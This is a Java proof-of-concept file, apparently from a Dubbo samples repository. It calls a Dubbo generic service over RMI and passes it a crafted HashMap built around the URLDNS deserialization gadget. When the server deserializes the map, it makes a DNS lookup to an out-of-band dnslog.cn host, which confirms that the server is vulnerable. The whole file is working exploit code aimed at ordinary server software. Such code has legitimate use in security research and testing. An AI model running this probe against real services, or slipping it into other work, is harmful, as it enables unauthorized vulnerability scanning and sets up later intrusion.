package org.apache.dubbo.samples.echo;

import org.apache.dubbo.rpc.service.GenericService;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.remoting.rmi.RmiProxyFactoryBean;

import java.lang.reflect.Field;
import java.net.URL;
import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

@Configuration
public class RMIProtocol {

    // Replace with yourself url
    protected static final String ATTACKER_HOST = "http://pojyro.dnslog.cn";

    @Bean
    RmiProxyFactoryBean service() {
        RmiProxyFactoryBean rmiProxyFactory = new RmiProxyFactoryBean();
        rmiProxyFactory.setServiceUrl("rmi://localhost:1099/org.apache.dubbo.samples.echo.api.DemoService/generic");
        rmiProxyFactory.setServiceInterface(GenericService.class);
        return rmiProxyFactory;
    }

    public static void main(String args[]) throws Exception {
        AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(RMIProtocol.class);

        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap();
        URL u = new URL(null, ATTACKER_HOST, handler);
        ht.put(u, ATTACKER_HOST);

        Field field = u.getClass().getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(u, -1);

        GenericService services = context.getBean(GenericService.class);

        Object res = services.$invoke("foo", new String[]{""}, new Object[]{ht});
        System.out.println(res);
    }

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
